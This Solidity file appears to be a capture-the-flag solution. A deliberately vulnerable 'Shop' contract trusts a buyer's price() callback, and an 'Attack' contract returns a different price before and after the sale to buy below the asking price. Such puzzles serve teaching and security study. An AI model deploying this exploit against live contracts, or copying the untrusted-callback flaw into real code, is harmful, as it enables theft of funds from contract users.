// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack is Buyer{
    Shop target;
    constructor(Shop _target)public {
        target= _target;
    }

    function attack()public payable  {
        target.buy();
    }
    
     function price() external view  override returns (uint){
         uint amount = !target.isSold() ? 101:5;
         return amount;
     }
}
